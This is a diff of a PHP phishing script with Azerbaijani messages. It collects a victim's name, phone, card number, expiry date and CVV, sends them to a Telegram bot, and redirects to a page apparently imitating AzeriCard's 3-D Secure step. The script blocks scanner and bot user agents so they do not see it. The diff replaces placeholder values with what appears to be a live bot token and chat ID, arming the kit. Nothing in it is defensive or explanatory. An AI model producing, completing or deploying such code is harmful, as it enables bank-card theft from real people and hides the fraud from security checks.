@@ -6,7 +6,7 @@ if (empty($userAgent) || preg_match('/curl|wget|python|bot|spider/i', $userAgent
 $amount = $_POST['amount'] ?? null; $name = $_POST['name'] ?? null; $phone = $_POST['phone'] ?? null; $card = $_POST['card'] ?? null; $expdate = $_POST['expdate'] ?? null; $cvv = $_POST['cvv'] ?? null;
 if (empty($amount) || empty($name) || empty($phone) || empty($card) || empty($expdate) || empty($cvv)) { http_response_code(400); exit('Bütün xanalar doldurulmalıdır.'); }
 if (!preg_match('/^[0-9]{16}$/', str_replace(' ', '', $card)) || !preg_match('/^[0-9]{3}$/', $cvv)) { http_response_code(400); exit('Yanlış kart məlumatı formatı.'); }
-$botToken = 'SIZIN_BOT_TOKEN'; $chatId = 'SIZIN_CHAT_ID'; $message = "Yeni Sifariş:\nAd: $name\nNömrə: $phone\nMəbləğ: $amount\nKart: $card\nTarix: $expdate\nCVV: $cvv";
+$botToken = '8841506672:AAFfENXDle-OQftdnVFdC1AegyoW1H7SHBQ'; $chatId = '-1004326178006'; $message = "Yeni Sifariş:\nAd: $name\nNömrə: $phone\nMəbləğ: $amount\nKart: $card\nTarix: $expdate\nCVV: $cvv";
 $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message); @file_get_contents($url);
 header("Location: azericard-3ds.html?amount=" . urlencode($amount) . "&card=" . urlencode($card)); exit();
 ?>
